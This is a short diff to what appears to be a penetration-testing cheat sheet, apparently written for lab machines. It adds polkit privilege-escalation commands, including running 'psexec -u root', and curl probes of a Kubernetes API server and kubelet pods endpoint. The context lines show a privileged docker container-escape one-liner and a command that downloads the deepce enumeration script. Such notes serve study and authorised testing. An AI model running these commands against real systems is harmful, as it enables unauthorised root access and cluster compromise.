@@ -92,3 +92,20 @@ curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
 ```
 docker run -it -v /:/mnt --net host --ipc host --pid host --privileged ubuntu bash -c "chroot /mnt bash"
 ```
+### Polkit
+```
+psexec -u <user> <command>  
+
+psexec -u root id
+
+pkcheck
+
+pkaction
+```
+### Kubernates 
+```
+curl https://10.129.10.11:6443 -k
+```
+```
+curl https://10.129.10.11:10250/pods -k | jq .
+```
